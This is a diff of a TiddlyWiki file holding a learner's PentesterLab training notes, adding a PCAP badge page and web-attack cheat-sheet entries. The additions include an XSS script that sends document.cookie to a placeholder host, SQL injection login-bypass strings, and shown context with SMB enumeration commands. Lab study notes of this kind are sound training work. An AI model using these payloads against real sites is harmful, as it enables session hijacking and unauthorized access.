@@ -234,6 +234,8 @@ Error message and password prompt
 
 <li>PentesterLab Notes - Essential Badge</li>
 
+<li>PentesterLab Notes - PCAP Badge</li>
+
 <li>PentesterLab Notes - Unix Badge</li>
 
 <li>PentesterLab Notes - White Badge</li>
@@ -8623,7 +8625,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="[[PentesterLab Notes]] [[PentesterLab Notes - Essential Badge]]" title="$:/StoryList">
+<div list="[[PentesterLab Notes - PCAP Badge]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10784,7 +10786,7 @@ enum4linux -v IP
 nmap --script smb-enum-users, smb-check-vulns
 ```</pre>
 </div>
-<div created="20180520170028027" modified="20180520170034810" title="PentesterLab Notes">
+<div created="20180520170028027" modified="20180731184304119" title="PentesterLab Notes">
 <pre>I've had PentesterLab Pro access for a while (1+ years) and I'm finally going through the modules. Taking notes because they may be useful to me or someone else.
 
 No write-ups are allowed for some of the exercises. I'll be posting resources in those cases.
@@ -10795,9 +10797,11 @@ Here's a referral link if you want to sign up for PentesterLab:  https://pentest
 
 [[PentesterLab Notes - Essential Badge]]
 
-[[PentesterLab Notes - White Badge]]</pre>
+[[PentesterLab Notes - White Badge]]
+
+[[PentesterLab Notes - PCAP Badge]]</pre>
 </div>
-<div created="20180520165112246" modified="20180730231136505" tags="" title="PentesterLab Notes - Essential Badge">
+<div created="20180520165112246" modified="20180731183728477" tags="" title="PentesterLab Notes - Essential Badge">
 <pre>There isn't much to note here since most of the exercise involve messing with HTTP requests and parameters. 
 
 Use Burp and advanced scope with .*libcurl.so as the host.
@@ -10881,11 +10885,18 @@ onmouseover onclick, onerror, and etc can help too.
 
 // to comment out stuff
 
+URL: index.php/XSS_PAYLOAD_HERE
+
+&lt;script&gt;
+document.write('&lt;img src=&quot;WEBSITE?VAR='+document.cookie+'&quot; /&gt;');
+&lt;/script&gt;
 
 ```
 
 String.fromcharcode: 
 https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/
+
+https://www.owasp.org/index.php/DOM_Based_XSS
 
 XML
 
@@ -10894,6 +10905,24 @@ XML
 
 // %26 is &amp; url encoded.
 ```
+
+SQL Injection
+
+```
+un/pw: ' OR 1=1 #
+
+&quot; OR 1=1 #
+
+' OR 1=1 LIMIT 1# // for one line return
+
+
+```</pre>
+</div>
+<div created="20180731184308977" modified="20180731190637900" title="PentesterLab Notes - PCAP Badge">
+<pre>Included basic pcap analysis.
+
+Following tcp stream helps. Filtering by protocol helps too.
+
 </pre>
 </div>
 <div created="20180519151923785" modified="20180520165814532" tags="" title="PentesterLab Notes - Unix Badge">
